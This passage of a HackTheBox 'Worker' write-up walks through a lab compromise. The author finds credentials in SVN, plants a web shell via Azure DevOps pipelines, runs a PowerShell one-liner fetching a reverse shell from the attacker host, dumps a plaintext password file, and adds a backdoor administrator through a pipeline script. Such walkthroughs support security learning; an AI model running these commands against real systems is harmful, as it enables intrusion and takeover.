</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p><p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «192.168.2.103»
$ svn diff -r 1:2 svn://10.10.10.203/
</code></pre></div><p><img class=img-container src=imgs/image-20210503175056134.png alt=image-20210503175056134></p><p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p><ul><li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li><li>A set of credentials: <code>nathen:wendel98</code></li></ul><p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>10.10.10.203 dimension.worker.htb devops.worker.htb
</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p><h3 id=tcp-80---dimensionworkerhtb>TCP 80 - dimension.worker.htb<a hidden class=anchor aria-hidden=true href=#tcp-80---dimensionworkerhtb>#</a></h3><p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p><p><img class=img-container src=imgs/image-20210503175111010.png alt=image-20210503175111010></p><p>It even leads to others static site (with subdomain) which I think they are just decoy.</p><p><img class=img-container src=imgs/image-20210503175127918.png alt=image-20210503175127918></p><p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p><ul><li><code>alpha.worker.htb</code></li><li><code>cartoon.worker.htb</code></li><li><code>lens.worker.htb</code></li><li><code>solid-state.worker.htb</code></li><li><code>spectral.worker.htb</code></li><li><code>story.worker.htb</code></li></ul><p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p><h2 id=foothold>Foothold<a hidden class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-iis-appool>Shell as IIS appool<a hidden class=anchor aria-hidden=true href=#shell-as-iis-appool>#</a></h3><h4 id=azure-devops---smarthotel360>Azure DevOps - SmartHotel360<a hidden class=anchor aria-hidden=true href=#azure-devops---smarthotel360>#</a></h4><p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p><p><img class=img-container src=imgs/image-20210503175154637.png alt=image-20210503175154637></p><p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p><p><img class=img-container src=imgs/image-20210503175211414.png alt=image-20210503175211414></p><p>User permission or group related settings are found to be under the Security menu (Project Settings -> Security Settings).</p><p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p><p><img class=img-container src=imgs/image-20210503175233456.png alt=image-20210503175233456></p><p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p><p><img class=img-container src=imgs/image-20210503175249455.png alt=image-20210503175249455></p><p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p><p><img class=img-container src=imgs/image-20210503230648404.png alt=image-20210503230648404></p><p>From there, I try to lookup into the project&rsquo;s repository.</p><p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p><p><img class=img-container src=imgs/image-20210503175346216.png alt=image-20210503175346216></p><p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p><blockquote><p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p></blockquote><p><img class=img-container src=imgs/image-20210503175356998.png alt=image-20210503175356998></p><p>User <code>nathen</code> is allowed to queue a builds.</p><p><img class=img-container src=imgs/image-20210503175409857.png alt=image-20210503175409857></p><p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p><h4 id=webshell-upload>Webshell Upload<a hidden class=anchor aria-hidden=true href=#webshell-upload>#</a></h4><p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p><p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p><p><img class=img-container src=imgs/image-20210503175435088.png alt=image-20210503175435088></p><p>I&rsquo;ll pick any available work items.</p><p><img class=img-container src=imgs/image-20210503175452577.png alt=image-20210503175452577></p><p>I can just drag and drop the web shell, and commit it afterwards.</p><p><img class=img-container src=imgs/image-20210503175506892.png alt=image-20210503175506892></p><p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p><p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p><p><img class=img-container src=imgs/image-20210503175518917.png alt=image-20210503175518917></p><p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p><p><img class=img-container src=imgs/image-20210503175531792.png alt=image-20210503175531792></p><p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p><p><img class=img-container src=imgs/image-20210503175541314.png alt=image-20210503175541314></p><p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href=https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3>PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>powershell.exe <span style=color:#e6db74>&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
</code></pre></div><p>I have a shell now on my listener.</p><p><img class=img-container src=imgs/image-20210503175604917.png alt=image-20210503175604917></p><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=shell-as-robisl>Shell as robisl<a hidden class=anchor aria-hidden=true href=#shell-as-robisl>#</a></h3><h4 id=internal-enumeration>Internal Enumeration<a hidden class=anchor aria-hidden=true href=#internal-enumeration>#</a></h4><p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href=https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens>BookHackTrick</a>, it can be abused using RogueWinRM.</p><p><img class=img-container src=imgs/image-20210503175615273.png alt=image-20210503175615273></p><p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p><p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p><p><img class=img-container src=imgs/image-20210503175630874.png alt=image-20210503175630874></p><p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>PS C:\Users&gt; net user robisl
User name                    robisl
Full Name                    Robin Islip
Comment                      
User’s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2020-04-05 21:27:26
Password expires             Never
Password changeable          2020-04-05 21:27:26
Password required            No
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2020-08-18 18:28:36

Logon hours allowed          All

Local Group Memberships      *Production           *Remote 
Global Group memberships     *None                 
The command completed successfully.
</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p><pre><code>PS C:\users\&gt;net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
W$           W:\                             Default share
ADMIN$       C:\Windows                      Remote Admin
The command completed successfully.
</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p><pre><code>PS W:\&gt; dir


    Directory: W:\


Mode                LastWriteTime         Length Name                                                             
----                -------------         ------ ----                                                             
d-----       2020-06-16     18:59                agents                                                          
d-----       2020-03-28     15:57                AzureDevOpsData                                                
d-----       2020-04-03     11:31                sites                                                          
d-----       2020-06-20     16:04                svnrepos
</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command></code> keyword.</p><pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p><pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p><p><img class=img-container src=imgs/image-20210504232344047.png alt=image-20210504232344047></p><p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p><pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
</code></pre><h4 id=remote-access---robisl>Remote Access - robisl<a hidden class=anchor aria-hidden=true href=#remote-access---robisl>#</a></h4><p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>→ root@kali «worker» «10.10.14.19»
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\r</span>obisl<span style=color:#ae81ff>\D</span>ocuments&gt; whoami
worker<span style=color:#ae81ff>\r</span>obisl
*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\r</span>obisl<span style=color:#ae81ff>\D</span>ocuments&gt; cd ../Desktop
*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\r</span>obisl<span style=color:#ae81ff>\D</span>esktop&gt; dir


    Directory: C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\r</span>obisl<span style=color:#ae81ff>\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2020   3:37 PM             <span style=color:#ae81ff>34</span> user.txt
</code></pre></div><h3 id=shell-as-administrator>Shell as administrator<a hidden class=anchor aria-hidden=true href=#shell-as-administrator>#</a></h3><h4 id=azure-devops---partsunlimited>Azure DevOps - PartsUnlimited<a hidden class=anchor aria-hidden=true href=#azure-devops---partsunlimited>#</a></h4><p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p><p><img class=img-container src=imgs/image-20210503175744995.png alt=image-20210503175744995></p><p>Long short story, <code>robisl</code> is member of Build Administrator.</p><p><img class=img-container src=imgs/image-20210503175756504.png alt=image-20210503175756504></p><p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&tabs=preview-page">source</a>].</p><p><img class=img-container src=imgs/image-20210504010111041.png alt></p><h4 id=exploit-azure-pipelines---read-the-root-flag>Exploit Azure Pipelines - Read the Root Flag<a hidden class=anchor aria-hidden=true href=#exploit-azure-pipelines---read-the-root-flag>#</a></h4><p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p><p><img class=img-container src=imgs/image-20210503175809136.png alt=image-20210503175809136></p><p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p><p><img class=img-container src=imgs/image-20210503175820811.png alt=image-20210503175820811></p><p>So, let’s execute the plan!</p><p>First, I’ll create a pipeline (Pipelines -> Builds -> New Pipeline).</p><p><img class=img-container src=imgs/image-20210503175837201.png alt=image-20210503175837201></p><p>In the next section, I’ll choose Azure Repos Git.</p><p><img class=img-container src=imgs/image-20210503175848517.png alt=image-20210503175848517></p><p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p><p><img class=img-container src=imgs/image-20210503175906165.png alt=image-20210503175906165></p><p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p><p><img class=img-container src=imgs/image-20210503175920007.png alt=image-20210503175920007></p><p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p><p>I’ll save it and run it on a new branch.</p><p><img class=img-container src=imgs/image-20210503175931307.png alt=image-20210503175931307></p><p>I’ll just wait for the output log.</p><p><img class=img-container src=imgs/image-20210503175944023.png alt=image-20210503175944023></p><p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p><p><img class=img-container src=imgs/image-20210503175957351.png alt=image-20210503175957351></p><h4 id=create-user-with-administrator-privileges>Create User with Administrator Privileges<a hidden class=anchor aria-hidden=true href=#create-user-with-administrator-privileges>#</a></h4><p>I can also create a privileged user using multi-line script.</p><pre><code>- script: | 
net user iamf YourComplexPassword /add /domain
net localgroup Administrators iamf /add 
net localgroup &quot;Remote Management Users&quot; iamf /add 
displayName: &quot;Set IamF to Admin&quot;
</code></pre><p>I can push it again and wait for it to complete.</p><p><img class=img-container src=imgs/image-20210503180039057.png alt=image-20210503180039057></p><p>Now I can login with the newly created user.</p><p><img class=img-container src=imgs/image-20210503180028754.png alt=image-20210503180028754></p><hr><p>References:</p><ul><li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li><li><a href=https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/>https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li><li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&tabs=yaml#ci-triggers</a></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/oscp-like/>OSCP-like</a></li><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/active-directory/>Active-Directory</a></li><li><a href=https://fahmifj.github.io/tags/svn/>Svn</a></li><li><a href=https://fahmifj.github.io/tags/webshell/>Webshell</a></li><li><a href=https://fahmifj.github.io/tags/azure-devops/>Azure-DevOps</a></li><li><a href=https://fahmifj.github.io/tags/azure-pipelines/>Azure-Pipelines</a></li><li><a href=https://fahmifj.github.io/tags/evil-winrm/>evil-winrm</a></li></ul><nav class=paginav><a class=prev href=https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/><span class=title>« Prev Page</span><br><span>HackTheBox - Blackfield</span></a>
<a class=next href=https://fahmifj.github.io/writeups/hackthebox/htb-buff/><span class=title>Next Page »</span><br><span>HackTheBox - Buff</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Worker on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Worker&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f&hashtags=OSCP-like%2cWindows%2cActive-Directory%2cSvn%2cWebshell%2cAzure-DevOps%2cAzure-Pipelines%2cevil-winrm"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Worker on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f&title=HackTheBox%20-%20Worker&summary=HackTheBox%20-%20Worker&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Worker on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f&title=HackTheBox%20-%20Worker"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Worker on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Worker on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Worker%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Worker on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Worker&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-worker%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>